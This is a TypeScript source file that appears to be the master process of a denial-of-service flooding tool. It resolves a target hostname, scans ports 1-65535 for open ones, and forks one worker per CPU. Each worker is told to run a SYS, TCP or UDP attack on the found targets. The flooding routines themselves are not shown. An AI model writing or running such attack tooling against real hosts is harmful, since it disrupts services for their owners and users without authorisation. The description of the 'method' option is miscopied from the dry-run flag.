import * as os from 'os';
import * as cluster from 'cluster';
import * as yargs from 'yargs';
import { resolveIPAddresses, checkPorts } from './helpers';
import { Address } from './types';

const getArgs = () => yargs
  .demandCommand(1)
  .option('d', {
    alias: 'dry-run',
    boolean: true,
    describe: 'dry run: do not actually perform the attack'
  })
  .option('m', {
    alias: 'method',
    string: true,
    describe: 'method: do not actually perform the attack',
    choices: ['SYS', 'TCP', 'UDP'],
    default: 'SYS'
  })
  .option('p', {
    alias: 'ports',
    string: true,
    describe: 'a range of ports to attack. e.g. 8000-8200',
    default: '1-65535',
    coerce: ports => {
      const matches = ports.match(/^([0-9]{0,5})-([0-9]{0,5})$/);
      if (!matches) {
        throw new Error('Invalid port range')
      }
  
      const lower = parseInt(matches[1], 10);
      const upper = parseInt(matches[2], 10);
  
      if (lower > 65535 || upper > 65535 || upper < lower) {
        throw new Error('Invalid port range');
      }
  
      return { lower, upper };
    }
  })
  .argv;

async function master() {
  const args = getArgs();
  const hostname: string = args._[0];

  console.log(`Resolving '${hostname}'`);

  const ipAddresses: Address[] = await resolveIPAddresses(hostname);
  if (!ipAddresses.length) {
    throw new Error(`Could not resolve ${hostname}`);
  }

  console.log('Found the following ip addresses:\n', ipAddresses.map(address => address.ip));

  const ipPorts = await checkPorts(ipAddresses, args.ports.lower, args.ports.upper);
  if (!ipPorts.length) {
    throw new Error(`Could not find any open ports`);
  }

  console.log('Using the following ip/port combinations:');
  ipPorts.forEach(ipPort => console.log(` - ${ipPort.ip}:${ipPort.port}`));

  if (args.dryRun) {
    console.log('Dry run; exiting early');
    return;
  }

  // For each CPU, fork the cluster.
  for (let i = 0; i < os.cpus().length; i++) {
    const worker = cluster.fork();

    worker.on('online', () => {
      worker.send({
        type: `attack-${args.method}`,
        data: ipPorts
      });
    });
  }

  // Intercept exit for cleanup.
  process.on('SIGINT', () => {
    console.log('Shutting down gracefully');

    for (const id in cluster.workers) {
      cluster.workers[id].send({
        type: 'kill'
      });
    }

    // Wait until all clusters have been cleared from memory, then exit the process.
    setInterval(() => {
      if (!Object.keys(cluster.workers).length) {
        console.log('All clusters are exited');

        process.exit();
      }
    }, 500);
  });
}

export default master;